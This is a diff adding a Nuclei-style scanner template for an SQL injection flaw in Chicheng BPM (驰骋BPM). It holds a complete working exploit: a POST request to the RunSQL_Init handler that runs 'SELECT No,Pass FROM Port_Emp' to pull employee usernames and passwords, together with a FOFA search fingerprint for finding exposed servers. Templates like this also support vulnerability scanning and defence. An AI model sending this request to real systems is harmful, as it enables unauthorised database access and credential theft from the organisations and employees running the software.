@@ -1,0 +1,45 @@
+id: chichengBPM-RunSQL_Init-sql
+
+info:
+  name: 驰骋BPM RunSQL_Init SQL注入漏洞
+  author: HuanXiong
+  severity: high
+  description: |-
+    fofa: icon_hash="-1564380241" || body="正在登录流程&表单引擎设计器,请稍候"
+  reference: |
+    -
+  tags: SQL Injection
+
+http:
+  - raw:
+      - |
+        POST /WF/Comm/Handler.ashx?DoType=RunSQL_Init HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Content-Type: multipart/form-data; boundary=----123128312312389898yd98ays98d
+
+        ------123128312312389898yd98ays98d
+        Content-Disposition: form-data; name="SQL"
+
+        SELECT No,Pass FROM Port_Emp
+        ------123128312312389898yd98ays98d--
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"No"'
+          - '"NO"'
+          - '"Pass"'
+          - '"PASS"'
+        condition: or
+      - type: status
+        status: 
+          - 200
+
+
+
+
+
+
